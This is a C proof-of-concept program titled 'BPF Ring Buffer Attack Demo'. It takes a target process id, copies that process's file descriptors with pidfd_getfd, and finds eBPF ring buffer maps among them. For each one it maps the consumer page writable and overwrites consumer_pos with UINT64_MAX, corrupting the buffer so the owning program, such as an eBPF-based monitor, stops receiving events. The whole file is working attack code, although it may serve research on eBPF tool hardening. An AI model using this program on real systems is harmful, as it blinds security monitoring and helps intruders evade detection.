#define _GNU_SOURCE
#include <linux/bpf.h>
#include "common.h"

struct ring_buffer {
    atomic_ulong *consumer_pos;
    atomic_ulong *producer_pos;
    void *data;
};

int get_bpf_map_info(int fd, struct bpf_map_info *info, __u32 *info_len) {
    union bpf_attr attr = {
            .info.bpf_fd = fd,
            .info.info_len = *info_len,
            .info.info = (uint64_t)(uintptr_t)info,
    };

    return syscall(__NR_bpf, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "please provide process id. \n usage: %s <pid>\n", argv[0]);
        return 1;
    }
    pid_t pid = atoi(argv[1]);
    int pidfd = pidfd_open(pid);
    if (pidfd < 0) {
        perror("pidfd_open");
        return 1;
    }
    printf("********************* BPF Ring Buffer Attack Demo *********************\n");
    printf("scanning pid %d for fds matching bpf ring buffers.\n", pid);
    int found = 0;
    for (int fd_num = 0; fd_num < MAX_FD_TRY; fd_num++) {
        int map_fd = pidfd_getfd(pidfd, fd_num);
        if (map_fd < 0)
            continue;

        struct bpf_map_info info = {};
        __u32 len = sizeof(info);
        if (get_bpf_map_info(map_fd, &info, &len) == 0) {
            if (info.type == BPF_MAP_TYPE_RINGBUF) {
                printf("found bpf ring buffer map at targetfd %d (map_fd: %d)\n", fd_num, map_fd);
                printf("info for bpf ring buffer map %d, map_id: %u, max_entries: %u\n", map_fd, info.id, info.max_entries);
                found++;
                struct ring_buffer r = {0};
                void *tmp = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, map_fd, 0);
                if (tmp == MAP_FAILED) {
                    perror("error occurred while mapping consumer_pos");
                    close(map_fd);
                    continue;
                }
                r.consumer_pos = (atomic_ulong *)tmp;
                size_t mmap_sz = PAGE_SIZE + 2 * info.max_entries; // we always map two times the max entries one page for producer the rest is data
                tmp = mmap(NULL, mmap_sz, PROT_READ, MAP_SHARED, map_fd, PAGE_SIZE);
                if (tmp == MAP_FAILED) {
                    perror("error occurred while mapping producer_pos + buffer");
                    munmap((void *)r.consumer_pos, PAGE_SIZE);
                    close(map_fd);
                    continue;
                }
                r.producer_pos = (atomic_ulong *)tmp;
                r.data = tmp + PAGE_SIZE;
                printf("found producer_pos: %lu\n", atomic_load_explicit(r.producer_pos, memory_order_acquire));
                printf("found consumer_pos: %lu\n", atomic_load_explicit(r.consumer_pos, memory_order_relaxed));
                atomic_store_explicit(r.consumer_pos, UINT64_MAX, memory_order_release);
                printf("consumer_pos for ring buffer %d has been corrupted.\n", map_fd);
                munmap((void *)r.consumer_pos, PAGE_SIZE);
                munmap((void *)r.producer_pos, mmap_sz);
                close(map_fd);
            }
        }

        close(map_fd);
    }
    if (found == 0) {
        printf("no bpf ring buffer maps found in pid %d :/. \n", pid);
    } else {
        printf("processed %d bpf ring buffer map(s).\n", found);
    }

    close(pidfd);
    return 0;
}
